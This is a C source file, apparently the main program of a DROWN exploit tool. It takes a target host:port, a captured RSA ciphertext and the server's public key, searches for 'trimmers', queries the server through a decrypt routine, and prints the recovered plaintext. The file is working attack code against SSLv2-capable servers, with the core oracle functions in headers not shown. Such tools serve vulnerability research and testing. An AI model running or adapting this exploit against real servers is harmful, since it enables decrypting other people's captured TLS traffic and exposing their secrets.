#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include "drown.h"
#include "trimmers.h"
#include "decrypt.h"


void drown_new(drown_ctx * dctx)
{
    dctx->ctx = BN_CTX_new();
    SSL_ASSERT(dctx->ctx != NULL);

    dctx->n = BN_new();
    SSL_ASSERT(dctx->n != NULL);

    dctx->e = BN_new();
    SSL_ASSERT(dctx->e != NULL);

    dctx->c = BN_new();
    SSL_ASSERT(dctx->c != NULL);

    dctx->s = BN_new();
    SSL_ASSERT(dctx->s != NULL);

    dctx->mt = BN_new();
    SSL_ASSERT(dctx->mt != NULL);
}

void drown_free(drown_ctx * dctx)
{
    BN_free(dctx->mt);
    BN_free(dctx->s);
    BN_free(dctx->c);
    BN_free(dctx->e);
    BN_free(dctx->n);
    BN_CTX_free(dctx->ctx);
}

int main(int argc, char *argv[])
{
    int res;

    // Initialize OpenSSL
    SSL_library_init();
    SSL_load_error_strings();

    // Create global context
    drown_ctx dctx;
    drown_new(&dctx);

    // Read arguments
    if(argc != 5)
    {
        fprintf(stderr, "Usage : %s host:port c n e\n", argv[0]);
    }

    // Initialize research parameters
    dctx.hostport = argv[1];

    res = BN_hex2bn(&dctx.c, argv[2]);
    MY_ASSERT(res != 0, "c is not a valid hexadecimal string");

    res = BN_hex2bn(&dctx.n, argv[3]);
    MY_ASSERT(res != 0, "n is not a valid hexadecimal string");

    res = BN_hex2bn(&dctx.e, argv[4]);
    MY_ASSERT(res != 0, "e is not a valid hexadecimal string");

    BN_one(dctx.s);

    // Create some trimmers

    trimmers_t trimmers;
    trimmers_new(&trimmers, 40);

    if(!find_trimmer(&dctx, &trimmers))
    {
        fprintf(stderr, "Could not find a valid trimmer\n");
        exit(EXIT_FAILURE);
    }

    decrypt(&dctx);

    // Try to decrypt the message
    BN_mod_inverse(dctx.s, dctx.s, dctx.n, dctx.ctx);
    BN_mod_mul(dctx.mt, dctx.mt, dctx.s, dctx.n, dctx.ctx);

    printf("And the winner is : ");
    BN_print_fp(stdout, dctx.mt);
    printf("\n");


    trimmers_free(&trimmers);
    drown_free(&dctx);

    return 0;
}
